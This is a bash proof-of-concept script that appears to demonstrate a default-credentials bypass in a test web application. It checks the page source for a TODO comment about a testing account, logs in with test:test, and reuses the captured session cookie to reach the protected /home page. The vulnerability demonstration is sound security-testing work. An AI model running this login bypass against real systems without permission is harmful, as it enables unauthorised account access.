#!/bin/bash

# POC: Default Credentials (test:test) Authentication Bypass
# This script demonstrates the vulnerability where hardcoded default credentials
# allow unauthorized access to the application

TARGET_URL="${1:-http://localhost}"
LOGIN_ENDPOINT="${TARGET_URL}/login"
HOME_ENDPOINT="${TARGET_URL}/home"

echo "============================================"
echo "Default Credentials POC"
echo "============================================"
echo "Target: $TARGET_URL"
echo ""

# Step 1: Check for default credentials hint in HTML comment
echo "[*] Step 1: Checking page source for credential hints..."
HTML_SOURCE=$(curl -s "$LOGIN_ENDPOINT" 2>/dev/null)

if echo "$HTML_SOURCE" | grep -q "TODO.*Delete.*testing.*account"; then
    echo "[+] Found TODO comment with testing account reference:"
    echo "$HTML_SOURCE" | grep -o "<!--.*TODO.*-->" || echo "$HTML_SOURCE" | grep -o "TODO.*testing.*account"
    echo ""
else
    echo "[-] TODO comment not found in page source"
fi

# Step 2: Test default credentials (test:test)
echo "[*] Step 2: Testing default credentials (test:test)..."
DEFAULT_LOGIN_RESPONSE=$(curl -s -i -X POST "$LOGIN_ENDPOINT" \
    -d "username=test&password=test" \
    -w "\n%{http_code}" 2>/dev/null)

HTTP_CODE=$(echo "$DEFAULT_LOGIN_RESPONSE" | tail -n1)
HEADERS=$(echo "$DEFAULT_LOGIN_RESPONSE" | head -n-1)

echo "[*] Response Code: $HTTP_CODE"

if echo "$HEADERS" | grep -q "302"; then
    echo "[+] SUCCESS: HTTP 302 redirect received - Authentication successful!"
    SESSION_COOKIE=$(echo "$HEADERS" | grep -i "Set-Cookie: session" | head -n1)
    if [ -n "$SESSION_COOKIE" ]; then
        echo "[+] Session cookie created:"
        echo "    $SESSION_COOKIE"
    fi
    LOCATION=$(echo "$HEADERS" | grep -i "Location:" | head -n1)
    if [ -n "$LOCATION" ]; then
        echo "[+] Redirect location: $LOCATION"
    fi
else
    echo "[-] Expected 302 redirect not received"
fi
echo ""

# Step 3: Test invalid credentials for comparison
echo "[*] Step 3: Testing invalid credentials (admin:admin) for comparison..."
INVALID_LOGIN_RESPONSE=$(curl -s -i -X POST "$LOGIN_ENDPOINT" \
    -d "username=admin&password=admin" \
    -w "\n%{http_code}" 2>/dev/null)

INVALID_HTTP_CODE=$(echo "$INVALID_LOGIN_RESPONSE" | tail -n1)
INVALID_HEADERS=$(echo "$INVALID_LOGIN_RESPONSE" | head -n-1)

echo "[*] Response Code: $INVALID_HTTP_CODE"

if echo "$INVALID_HEADERS" | grep -q "Invalid username or password"; then
    echo "[+] Expected error message found: Invalid credentials rejected"
elif echo "$INVALID_HEADERS" | grep -q "200"; then
    echo "[+] HTTP 200 received - error page displayed"
else
    echo "[-] Unexpected response"
fi
echo ""

# Step 4: Verify session validity
echo "[*] Step 4: Testing session validity by accessing protected endpoint..."
SESSION=$(echo "$HEADERS" | grep -i "Set-Cookie: session=" | grep -o "session=[^;]*" | cut -d'=' -f2)

if [ -n "$SESSION" ]; then
    echo "[*] Using session cookie: $SESSION"
    HOME_RESPONSE=$(curl -s -i -X GET "$HOME_ENDPOINT" \
        -H "Cookie: session=$SESSION" \
        -w "\n%{http_code}" 2>/dev/null)
    
    HOME_CODE=$(echo "$HOME_RESPONSE" | tail -n1)
    HOME_CONTENT=$(echo "$HOME_RESPONSE" | head -n-1)
    
    echo "[*] Home endpoint response: $HOME_CODE"
    
    if [ "$HOME_CODE" = "200" ]; then
        echo "[+] SUCCESS: Protected endpoint accessible with default credentials!"
        echo "[+] Session is valid and user is authenticated"
    else
        echo "[-] Protected endpoint returned: $HOME_CODE"
    fi
else
    echo "[-] No session cookie found in response"
fi

echo ""
echo "============================================"
echo "POC Complete"
echo "============================================"